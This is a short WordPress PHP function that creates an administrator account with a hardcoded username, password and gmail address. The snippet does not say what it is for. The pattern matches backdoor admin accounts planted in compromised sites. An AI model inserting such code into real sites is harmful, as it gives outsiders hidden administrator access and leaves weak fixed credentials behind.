<?php

function hu_create_custom_admin_user() {
    $username = 'customadmin';
    $password = 'StrongPassword123!';
    $email = 'customadmin@gmail.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);

        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}

